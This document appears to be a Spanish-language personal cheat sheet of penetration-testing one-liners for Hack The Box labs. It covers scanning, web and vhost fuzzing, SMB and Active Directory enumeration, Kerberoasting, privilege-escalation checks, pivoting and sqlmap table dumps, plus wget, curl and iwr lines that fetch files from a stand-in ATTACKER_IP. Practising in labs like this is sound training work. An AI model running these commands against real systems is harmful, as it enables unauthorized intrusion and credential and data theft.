---
title: One-liners
tags: [htb, snippets, one-liners]
created: 2026-04-29
related:
  - "[[HTB/methodology/00-recon-checklist|Recon Checklist]]"
  - "[[HTB/snippets/transfers|Transfers]]"
---

# One-liners

> [!abstract] TL;DR
> Comandos cortos para copiar durante boxes. Reemplazar `IP`, `HOST`, `USER`, `PASS`.

## Recon

```bash
export IP=10.10.10.10; mkdir -p scans loot
sudo nmap -p- --min-rate 5000 -oN scans/all-ports.txt $IP
ports=$(grep -oP '\d+(?=/tcp\s+open)' scans/all-ports.txt | paste -sd, -)
sudo nmap -sC -sV -A -p $ports -oN scans/detail.txt $IP
```

## Web

```bash
whatweb http://$IP
curl -i http://$IP
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,js,bak,zip
```

Vhost:

```bash
ffuf -u http://$IP/ -H "Host: FUZZ.HOST" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE
```

## SMB

```bash
smbclient -L //$IP -N
smbmap -H $IP
enum4linux-ng -A $IP
crackmapexec smb $IP -u USER -p PASS --shares
```

## AD

```bash
crackmapexec smb $IP
ldapsearch -x -H ldap://$IP -s base namingcontexts
bloodhound-python -u USER -p PASS -d DOMAIN -ns $IP -c All --zip
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip $IP -request
```

## Linux local

```bash
whoami; id; hostname; cat /etc/os-release; uname -a; sudo -l; ss -tulpen
find / -perm -4000 -type f -ls 2>/dev/null
getcap -r / 2>/dev/null
```

## Windows local

```cmd
whoami /priv && whoami /groups && systeminfo && ipconfig /all && netstat -abno
```

```powershell
Get-LocalUser; Get-LocalGroup; Get-NetTCPConnection -State Listen
```

## Transfers

```bash
python3 -m http.server 8000
wget http://ATTACKER_IP:8000/file -O /tmp/file
curl http://ATTACKER_IP:8000/file -o /tmp/file
```

```powershell
iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\Windows\Temp\file.exe
```

## Pivot

```bash
ssh -L 8080:127.0.0.1:80 user@$IP
ssh -D 1080 user@$IP
proxychains nmap -sT -Pn -p80,445 10.10.20.5
```

## SQLi

```bash
sqlmap -r req.txt --batch
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D appdb -T users --dump --batch
```
